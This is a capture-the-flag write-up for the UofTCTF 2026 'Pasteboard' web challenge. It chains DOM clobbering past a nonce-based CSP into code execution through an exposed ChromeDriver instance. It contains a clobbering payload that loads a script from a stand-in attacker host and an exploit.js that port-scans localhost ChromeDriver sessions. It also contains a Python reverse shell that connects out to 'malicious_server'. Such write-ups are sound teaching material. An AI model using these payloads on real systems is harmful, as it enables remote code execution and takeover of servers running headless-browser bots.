---
title: UofTCTF 2026 - Pasteboard Writeup
published: 2026-01-16
description: 'Web challenge from UofTCTF 2026, chaining DOM Clobbering and Chromedriver RCE.'
image: './ss.png'
thumbnail: './UofT_CTF_Logo_Redesigned.png'
tags: [Web, Client-side, DOM Clobbering, Headless Browser]
category: 'CTF Writeups'
draft: false 
lang: ''
---

This is my first ever writeup! I played [**UofTCTF 2026**](https://ctf.uoftctf.org/) with team [**Project Sekai**](https://ctftime.org/team/169557/), and we finished in **2nd place** 🥈 overall. I solved this challenge alongside [**Beluga**](https://blog.lordrukie.com/), and we were the second team to solve it. By the end of the CTF, it had **33/1736** solves.

You can find the challenge source code in the [UofTCTF Github](https://github.com/UofTCTF/uoftctf-2026-chals-public/tree/main/pasteboard).

## Overview
The challenge features a notes website where we can create notes and send them to an admin bot for review. Reading the bot's code, we see that the flag is stored in a global variable `FLAG`, and no session cookies are used. So we need to find a way to access this variable's value, leak the bot's source code, or achieve RCE.

**bot.py:**
```python
import time

from selenium import webdriver
from selenium.webdriver.chrome.options import Options

BASE_URL = "http://127.0.0.1:5000"
FLAG = "uoftctf{fake_flag}"

def visit_url(target_url):
    options = Options()
    options.add_argument("--headless=true")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=options)
    try:
        driver.get(target_url)
        time.sleep(30)
    finally:
        driver.quit()
```
The view that renders our notes, it appears our input is reflected in two places, one of them insecurely as it uses `safe`.

**view.html:**
```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>View Note</title>
    <link rel="stylesheet" href="/static/style.css" />
  </head>
  <body>
    <main>
      <header class="row">
        <div>
          <h1>Note</h1>
          <p class="meta">Note: {{ note.title }}</p>
        </div>
        <a class="button ghost" href="/">Back</a>
      </header>
      <div id="injected">{{ msg|safe }}</div>
      <template id="rawMsg">{{ msg|e }}</template>
      <div id="card" data-mode="safe"></div>
      <script id="errorReporterScript"></script>
    </main>
    <script nonce="{{ nonce }}" src="/static/dompurify.min.js"></script>
    <script nonce="{{ nonce }}" src="/static/app.js"></script>
  </body>
</html>
```
We also observe that two scripts are loaded: `dompurify.js` and `app.js`.

**app.js:**
```javascript
(function () {
  const n = document.getElementById("rawMsg");
  const raw = n ? n.textContent : "";
  const card = document.getElementById("card");

  try {
    const cfg = window.renderConfig || { mode: (card && card.dataset.mode) || "safe" };
    const mode = cfg.mode.toLowerCase();
    const clean = DOMPurify.sanitize(raw, { ALLOW_DATA_ATTR: false });
    if (card) {
      card.innerHTML = clean;
    }
    if (mode !== "safe") {
      console.log("Render mode:", mode);
    }
  } catch (err) {
    window.lastRenderError = err ? String(err) : "unknown";
    handleError();
  }

  function handleError() {
    const el = document.getElementById("errorReporterScript");
    if (el && el.src) {
      return;
    }

    const c = window.errorReporter || { path: "/telemetry/error-reporter.js" };
    const p = c.path && c.path.value
      ? c.path.value
      : String(c.path || "/telemetry/error-reporter.js");
    const s = document.createElement("script");
    s.id = "errorReporterScript";
    let src = p;
    try {
      src = new URL(p).href;
    } catch (err) {
      src = p.startsWith("/") ? p : "/telemetry/" + p;
    }
    s.src = src;

    if (el) {
      el.replaceWith(s);
    } else {
      document.head.appendChild(s);
    }
  }
})();
```

The script goal is to sanitize user input using DOMPurify. However, it only sanitizes the `div` with id `rawMsg`. Recall that our input is also inserted into the `div` with id `injected`, which is not affected by this sanitization. Unfortunately as soon as we start testing, we encounter execution blocks due to CSP violations.  

**Content Security Policy**:
```http
default-src 'self'; base-uri 'none'; object-src 'none'; img-src 'self' data:; style-src 'self'; connect-src *; script-src 'nonce-rokhbv2TzXL8wGwuKKPSKw' 'strict-dynamic'
```

:::note
The `'strict-dynamic'` source expression specifies that the trust explicitly given to a script present in the markup, by accompanying it with a nonce or a hash, shall be propagated to all the scripts loaded by that root script.
:::

## Solution

Knowing this, we must find a way for our script to originate from one of the existing trusted scripts.   
If we carefully analyze `app.js`, we can see how the `handleError()` function inserts a script, constructing it from an object `c` that is vulnerable to DOM Clobbering (line 27). This function executes within the `catch` block but fortunately, we can trigger an error via a second DOM Clobbering in the definition of the `cfg` variable (line 7), since our Object will not have a `mode` property, causing an error when `toLowerCase()` method is called (line 8).  So we can clobber it with the following html injection on a note.

```html
<a id="renderConfig"></a>
<form id="errorReporter">
  <input name="path" value="https://malicious_server/exploit.js">
</form>
```
At this point, we have achieved executable JS code injection. But now what? How on earth do we extract the `FLAG` via JS? I explored several paths involving iframes and local file access, hoping that an automated environment might have exposed interfaces or weakened configurations... And it turns out it did!

The vulnerability wasn't in the browser's sandbox itself, but in the WebDriver orchestration. To automate the session, the system was running ChromeDriver, which by default listens on a random port (32768-60999). Specifically, the `/session` endpoint allows us to specify the binary and arguments for the "browser". In this case, instead of a browser, we will point it to the Python interpreter binary and pass a reverse shell as arguments achieving RCE!  
**exploit.js:**
```javascript
y = 32768
data = {
    "capabilities": {
        "alwaysMatch": {
            "goog:chromeOptions": {
                "binary": "/usr/local/bin/python",
                "args": ["-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('malicious_server',malicious_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('sh')"]
            }
        }
    }
}

while (y != 60999) {
    fetch(`http://localhost:${y}/session`, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    y++
}
```

The attack flow can be visualized as follows:

<div class="mermaid">
sequenceDiagram
    participant Attacker
    participant Server
    participant Bot
    participant Chromedriver
    Attacker->>Server: Create Malicious Note
    Attacker->>Bot: Report Note URL
    Bot->>Server: Visit Note URL
    Server-->>Bot: Return Page
    Bot->>Bot: app.js crashes
    Bot->>Bot: handleError ( ) executes
    Bot->>Bot: Load malicious script
    Bot->>Chromedriver: exploit.js /session request
    Chromedriver-->>Attacker: RCE Reverse Shell
</div>

By chaining these vulnerabilities, we successfully bypass the CSP and turn a client-side injection into full Remote Code Execution on the server infrastructure.

I hope you enjoyed reading this post and see you in the next CTF!

## References
- https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model
- https://developer.mozilla.org/en-US/docs/Web/API/HTML_DOM_API
- https://html.spec.whatwg.org/#naming-form-controls:-the-name-attribute
- https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/
- https://portswigger.net/web-security/dom-based
- https://portswigger.net/research/dom-clobbering-strikes-back
- https://www.fastmail.com/blog/sanitising-html-the-dom-clobbering-issue/
- https://domclob.xyz/domc_wiki/
- https://splitline.github.io/DOM-Clobber3r/
- https://book.jorianwoltjer.com/web/client-side/headless-browsers#chromedriver
- https://issuetracker.google.com/issues/40052697
